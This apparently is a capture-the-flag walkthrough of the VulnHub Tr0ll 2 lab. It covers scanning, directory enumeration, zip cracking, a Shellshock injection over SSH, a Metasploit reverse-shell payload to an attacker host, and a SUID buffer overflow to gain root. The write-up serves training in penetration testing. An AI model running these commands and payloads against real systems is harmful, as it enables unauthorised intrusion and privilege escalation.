---
title: 'Hack the Tr0ll 2 (Boot2Root Challenge)'
date: 2019-12-08T18:44:00+01:00
draft: false
---

Hello everyone and welcome to this CTF challenge. This is the next part to Tr0ll by Maleus. You can download the lab from **[here](https://www.vulnhub.com/entry/tr0ll-2,107/)**. The objective of this lab is to get root and capture the flag.  
The level of this challenge is not so tough and its difficulty level is described as beginner/intermediate.  

### **Penetrating Methodologies**

*   Network scanning (Nmap, Netdiscover)
*   Information Gathering
*   Analyzing web source code
*   Get robort.txt
*   Directory enumeration with the help of robots.txt (Dirb)
*   Found encoded answer.txt file
*   Decoding base64 text file
*   FTP login for Zip file
*   Cracking zip file (Fcrackzip)
*   Exploiting shellshock to get a shell in bash.
*   Spwan tty shell (Metasploit)
*   Privilege escalation
*   Finding vulnerable binary
*   Finding EIP offset
*   Exploiting buffer overflow
*   Getting the root flag

So, let’s get started!  
The first step is as always, IP grabbing. In my case, the IP was 192.168.1.131. Use the following command to grab the IP :  
  

netdiscover

1

netdiscover

![](https://i1.wp.com/2.bp.blogspot.com/-HkoqRgEc920/W2GaTjvfT5I/AAAAAAAAZBI/leLCxQJ4JuMhvFBp_ETqOSJzBZRGt3wzwCLcBGAs/s1600/1.png?w=687&ssl=1)  
Next step was port scanning and the discovery of open ports using nmap.  

nmap -A 192.168.1.131

1

nmap  \-A  192.168.1.131

And we found 3 ports open- **21, 22, 80**; with the service of **FTP, SSH, and HTTP** respectively.  
  
![](https://i2.wp.com/1.bp.blogspot.com/-l7JeYrdqrVo/W2GaWCF_VxI/AAAAAAAAZB0/TWehooxmPtkoBQmiOoOta2ZnrDvAKuvUQCEwYBhgL/s1600/2.png?w=687&ssl=1)  
So, we tried to open the IP in the browser to see what was in the web page and sure as hell, that troll face again! It really did live up to its name after all!  
![](https://i0.wp.com/1.bp.blogspot.com/-VdfOTe5-_h4/W2GaYIQGM_I/AAAAAAAAZCc/tchx_cwu57c1zlhqnj52_HTtY5pTJtuWwCEwYBhgL/s1600/3.png?w=687&ssl=1)  
So, we opened the home page’s source code using curl:  

curl http://192.168.1.131

1

curl http://192.168.1.131

![](https://i0.wp.com/2.bp.blogspot.com/-xW6zlpg_tfg/W2GaZE61ulI/AAAAAAAAZCo/xS_16RB1Vj4jn1w_nMrsuAhq2XUFg2m0wCEwYBhgL/s1600/4.1.png?w=687&ssl=1)  
We, then enumerated the IP using dirb to find something interesting and something did catch our eyes—robots.txt  

dirb http://192.168.1.131

1

dirb http://192.168.1.131

![](https://i0.wp.com/3.bp.blogspot.com/-oEvleVNtPF4/W2GaZHaXooI/AAAAAAAAZCs/CJPtRVtjhLQ0d1EwkFiuPhJqa_qh71xnQCEwYBhgL/s1600/4.png?w=687&ssl=1)  
Therefore, we opened robots.txt in the web browser and we saw a lot of directory names.  
![](https://i1.wp.com/4.bp.blogspot.com/-hqqtHTnUFEI/W2GaZgDU5-I/AAAAAAAAZCw/8LwdyZ4FabM34ubwsnTqq7Eu_cDHTC36ACEwYBhgL/s1600/5.png?w=687&ssl=1)  
So, we downloaded robots.txt using wget and tried to make a dictionary out of it in hope that we find something good in one of them.  

wget http://192.168.1.131/robots.txt nano robots.txt

1

2

wget http://192.168.1.131/robots.txt

nano robots.txt

(Removed the ‘/’ from each line and saved it)  
![](https://i1.wp.com/4.bp.blogspot.com/-rZ9PlpvQ1gc/W2GaZkSY76I/AAAAAAAAZC0/3zMDFIY-VyY9fuO5q1mo1cK1S3OzD542wCEwYBhgL/s1600/6.png?w=687&ssl=1)  
Enumerating it again with the custom dictionary we just made, few other directories were found.  

dirb http://192.168.1.131/ robots.txt

1

dirb http://192.168.1.131/ robots.txt

![](https://i0.wp.com/2.bp.blogspot.com/-g6C4dHKwJiI/W2GaZxSMBNI/AAAAAAAAZC4/1q_azlBRr0AcrtKvCdh6u7VICo1Od1u4QCEwYBhgL/s1600/7.png?w=687&ssl=1)  
So, we hit each directory on the browser and inspected each image since there was nothing else to play within the directories.  
One by one we started searching each directory but nothing appealed to us. It all had the same troll image.  
![](https://i0.wp.com/2.bp.blogspot.com/-Vs6IrY1KUf0/W2GaaJKAVpI/AAAAAAAAZC8/F-dZZ-EzypQOcQmctmSDn-gwx7ZhLd-ngCEwYBhgL/s1600/8.png?w=687&ssl=1)  
We checked the source code of the page but nothing seemed good.  
![](https://i0.wp.com/1.bp.blogspot.com/-eNAv0K_mvGc/W2GaaIyNKnI/AAAAAAAAZDA/gd40rh80ua8wc01NtUUiU-S_k6jfwDcWwCEwYBhgL/s1600/9.png?w=687&ssl=1)  
  
  
Hence, we downloaded cat\_the\_troll.jpg from each directory but one such directory called dont\_bother had something interesting in its image.  

wget http://192.168.1.131/dont\_bother/cat\_the\_troll.jpg

1

wget http://192.168.1.131/dont\_bother/cat\_the\_troll.jpg

![](https://i0.wp.com/4.bp.blogspot.com/-R8lZKczS0xw/W2GaTmVsvQI/AAAAAAAAZBM/OXtfKT99hlcNAuDEfgC5uLwMLWNeuqnlQCEwYBhgL/s1600/10.png?w=687&ssl=1)  
We read the last three lines of the image’s coding using tail command:  

tail –n 3 cat\_the\_troll.jpg

1

tail  –n  3  cat\_the\_troll.jpg

![](https://i1.wp.com/2.bp.blogspot.com/-O52O26wlTo8/W2GaT1eCL1I/AAAAAAAAZBQ/ll5T5mXmJ08RWFzfVNHpv5KPmfOLdxH4ACEwYBhgL/s1600/11.png?w=687&ssl=1)  
The code really said to look deep within “y0ur\_self” to find the answer. Could it be a directory? let’s find out.  
![](https://i0.wp.com/3.bp.blogspot.com/--rGBjcDYU3Q/W2GaUSX77gI/AAAAAAAAZBU/ZwhzEeHWRHwD7s2Bl5kwdOnkS4eBqKW3gCEwYBhgL/s1600/12.png?w=687&ssl=1)  
Voila! It indeed is a directory and really has an answer in it. But on opening **answer.txt**, the dictionary seemed to be **base64** encoded.  
![](https://i2.wp.com/1.bp.blogspot.com/-Humg3T2JV48/W2GaUj1iDlI/AAAAAAAAZDE/EzdMeHTeQnkzx3Pkt5KLHygPttUZUV1uwCEwYBhgL/s1600/13.png?w=687&ssl=1)  
  
We again downloaded the answer.txt file using wget and decoded it into a new file **decoded.txt**  

wget http://192.168.1.131/y0ur\_self/answer.txt

1

wget http://192.168.1.131/y0ur\_self/answer.txt

![](https://i0.wp.com/2.bp.blogspot.com/-OPaMcTijHMA/W2GaUj1-qcI/AAAAAAAAZBc/bgZsvCkQbwQjAzz5aZ__YcVO8HMkJVJHwCEwYBhgL/s1600/14.png?w=687&ssl=1)  
Decoded it using:  

base64 -d answer.txt>decoded.txt

1

base64  \-d  answer.txt\>decoded.txt

![](https://i1.wp.com/1.bp.blogspot.com/-sBgtTT50oLk/W2GaUzlY6EI/AAAAAAAAZBg/lLpCvT_KwkQTJef3vT7RkBU_NLx5LwxSQCEwYBhgL/s1600/15.png?w=687&ssl=1)  
Let’s save this dictionary for future use and move on to another port we discovered—the FTP port.  
We had no idea of the username and password and neither was there any password or username file found.  
But remember the very first source code we viewed? It had the author name Tr0ll.  
Could that be the username and default password for FTP?  
It was a complete hit and try method but we successfully got logged in!  

ftp 192.168.1.131 ls get lmao.zip

1

2

3

ftp  192.168.1.131

ls

get lmao.zip

![](https://i1.wp.com/3.bp.blogspot.com/-KTw2sxYx0dQ/W2GaVEgasyI/AAAAAAAAZBk/ISBJdklsusc8MsME_FXSURPi1IiBOO0rQCEwYBhgL/s1600/16.png?w=687&ssl=1)  
We found a zip file “lmao.zip” in FTP. But the zip had password protection.  
Wait… what about the file we just decoded? Could it have a password for the zip file?  

fcrackzip –u –D –p decoded.txt lmao.zip

1

fcrackzip  –u  –D  –p  decoded.txt lmao.zip

We found the password!. Let’s unzip the file now.  

unzip lmao.zip

1

unzip lmao.zip

And enter the password: **ItCantReallybeThisEasyRightLOL**  
![](https://i1.wp.com/3.bp.blogspot.com/-2yu1mH7O0xc/W2GaVnM09rI/AAAAAAAAZBo/p1UUHd-BCfI11DsbUI4T6vn_CisQTMZIwCEwYBhgL/s1600/17.png?w=687&ssl=1)  
We had a high curiosity about the file “noob”.  
**cat noob**  
Turned out, it was an RSA key to SSH  
![](https://i0.wp.com/2.bp.blogspot.com/-22JX5pRWMng/W2GaVlqUsDI/AAAAAAAAZDE/gI9uehs6cOI2lffTSQ-GoO_ymg3xr65WQCEwYBhgL/s1600/18.png?w=687&ssl=1)  
Without any delay, we tried to login to SSH using this RSA key but we got trolled, yet again!  

chmod 600 noob ssh –i noob noob@192.168.1.131

1

2

chmod  600  noob

ssh  –i  noob noob@192.168.1.131

![](https://i0.wp.com/3.bp.blogspot.com/-DgreLCKBXec/W2GaV8ptR_I/AAAAAAAAZBw/Gaptgd9npSMOqmLxO_Bxww0eyB8w6IF7wCEwYBhgL/s1600/19.png?w=687&ssl=1)  
A complete arrow in the dark was to exploit shellshock vulnerability in SSH. So, we tried the command:  

ssh –i noob noob@192.168.1.131 '() ( : ;}; /bin/bash'

1

ssh  –i  noob noob@192.168.1.131  '() ( : ;}; /bin/bash'

And we got logged in!  

id

1

id

![](https://i2.wp.com/2.bp.blogspot.com/-LbBXmat_x3g/W2GaWCmmd8I/AAAAAAAAZB4/2qox-WWKDEAUfd7ENtinZjZ_pcqOFQvggCEwYBhgL/s1600/20.png?w=687&ssl=1)  
But it isn’t a proper teletype. We used web delivery in Metasploit to create a python shell to get a proper meterpreter session.  

msf > use multi/script/web\_delivery msf exploit(multi/script/web\_delivery) > set payload python/meterpreter/reverse\_tcp msf exploit(multi/script/web\_delivery) > set lhost 192.168.1.132 msf exploit(multi/script/web\_delivery) > set lport 4444 msf exploit(multi/script/web\_delivery) > run

1

2

3

4

5

msf  \>  use  multi/script/web\_delivery

msf exploit(multi/script/web\_delivery)  \>  set payload python/meterpreter/reverse\_tcp

msf exploit(multi/script/web\_delivery)  \>  set lhost  192.168.1.132

msf exploit(multi/script/web\_delivery)  \>  set lport  4444

msf exploit(multi/script/web\_delivery)  \>  run

![](https://i1.wp.com/3.bp.blogspot.com/-mctwU3pPDcc/W2GaWudIFuI/AAAAAAAAZB8/dCk1ZyIg0uYd4LWbCsqRtQ6O8dCQTsF1ACEwYBhgL/s1600/21.png?w=687&ssl=1)  
We copied above-generated python code to the improper bash we just created.  
![](https://i1.wp.com/2.bp.blogspot.com/-V702QlFzghk/W2GaWtSTDzI/AAAAAAAAZCA/Sb9VqUzEaJkFSOei-21l3W9Ug8ufAId8wCEwYBhgL/s1600/22.png?w=687&ssl=1)  
On the other hand, we had got a meterpreter session.  

sysinfo

1

sysinfo

![](https://i0.wp.com/3.bp.blogspot.com/-IOj104WULWA/W2GaW3sBiYI/AAAAAAAAZCE/cU94x3aePSMnvFyHwhPaNNNlzoVaX17TwCEwYBhgL/s1600/23.png?w=687&ssl=1)  
Let’s get into the shell and try to spawn a proper teletype.  

shell python –c "import pty;pty.spawn('/bin/bash');" find / -perm -4000 2>/dev/null

1

2

3

shell

python  –c  "import pty;pty.spawn('/bin/bash');"

find  /  \-perm  \-4000  2\>/dev/null

![](https://i0.wp.com/2.bp.blogspot.com/-M11LcTF74vQ/W2GaXFoSvpI/AAAAAAAAZCI/5Ng1ZUw-8dwLko-SHlJ0mNkG_VzHibOxgCEwYBhgL/s1600/24.png?w=687&ssl=1)  
The r00t binary in these directory work differently and change their behavior with each other on every reboot. One of these binaries (in our case it was in door2, it changes on reboot) accept a string as an argument and print it.  
![](https://i1.wp.com/1.bp.blogspot.com/-PLL8ztseE7w/W2GaXH4NYDI/AAAAAAAAZCM/GNKfPTEdbMs0ZwCjl6Av3reQVXVuZdu6QCEwYBhgL/s1600/25.png?w=687&ssl=1)  
We open the binary in gdb debugger to look at the assembly code for the binary. At main+71 we find a strcpy function, as the strcpy function is vulnerable to buffer overflow we try to exploit it.  
![](https://i0.wp.com/2.bp.blogspot.com/-5hglzlZh020/W2GaXrHy7BI/AAAAAAAAZCQ/4G7Gwexu9xQL0arQrtNu3He7f7a26lLiwCEwYBhgL/s1600/26.png?w=687&ssl=1)  
First, we create a 500 bytes long string to find the EIP offset using a pattern\_create script.  

./pattern\_create.rb -l 500

1

./pattern\_create.rb  \-l  500

![](https://i0.wp.com/4.bp.blogspot.com/-zbg0AGOMDw0/W2GaXhnd-OI/AAAAAAAAZCU/XU_RsrilSmwbSqjRNHmUNqq4LDcrRc0oQCEwYBhgL/s1600/27.png?w=687&ssl=1)  
We run the file in gdb along with the 500-byte character as the argument and find that the EIP register was overwritten with 0x6a413969.  
![](https://i0.wp.com/2.bp.blogspot.com/-8mAnfIdPQZk/W2GaYDGJNKI/AAAAAAAAZCY/tzLYClAW8KcHNKvAcTcyqYiyGzdZK9CvACEwYBhgL/s1600/28.png?w=687&ssl=1)  
We pass that into /usr/share/metasploit-framework/tools/pattern\_offset.rb, we get an offset of 268. So we need to write 268 characters and then write the address of the instructions we want to be executed.  

./pattern\_offset.rb -q 6a413969

1

./pattern\_offset.rb  \-q  6a413969

![](https://i0.wp.com/1.bp.blogspot.com/-b2PPiUMJ1ck/W2GaYUfR1EI/AAAAAAAAZCg/zjTBw3OYgFwErx-xe49te30DykP2SzhjACEwYBhgL/s1600/30.png?w=687&ssl=1)  
After getting the offset we find the ESP and find it to be 0xbffffc70 but we create our own exploit and execute it. But we get an error with illegal instruction that is because gdb has a different environment. Now, we remove 1 byte and take the ESP to be 0xbffffc80. We run the binary code by ignoring the environment along the exploit as per the argument. As soon as we execute the exploit we get a spawn a shell as root, and then when you open the /root directory and find a file called Proof.txt. When you take a look at the content of the files and find the final flag.  
![](https://i1.wp.com/1.bp.blogspot.com/-FzHIC1N0Ch0/W2GaY9Z04_I/AAAAAAAAZCk/jqYTPr1eXUwnRif6YaNwe9vsOCvJXzaeACEwYBhgL/s1600/31.png?w=687&ssl=1)